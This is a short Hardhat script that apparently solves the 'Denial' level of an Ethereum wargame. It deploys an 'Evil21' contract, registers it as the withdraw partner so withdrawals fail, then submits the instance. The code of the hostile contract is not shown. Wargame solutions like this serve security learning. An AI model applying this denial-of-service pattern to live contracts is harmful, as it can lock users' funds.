import { ethers } from "hardhat";
import { Denial__factory, Evil21__factory } from "../typechain-types";

async function main() {
  let [deployer] = await ethers.getSigners();

  console.log(deployer.address);
  let tx;

  let contract = "0xE4fb99fbB344e4e3dC449CD6657b2BBE3bAc7477";

  let denial = new Denial__factory(deployer).attach(contract);

  let evil = await new Evil21__factory(deployer).deploy();

  tx = await denial.setWithdrawPartner(evil.address);
  await tx.wait();
  console.log(tx);

  tx = await deployer.sendTransaction({
    to: "0xD2e5e0102E55a5234379DD796b8c641cd5996Efd",
    data: "0xc882d7c2000000000000000000000000E4fb99fbB344e4e3dC449CD6657b2BBE3bAc7477",
  });
  await tx.wait();
  console.log(tx);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
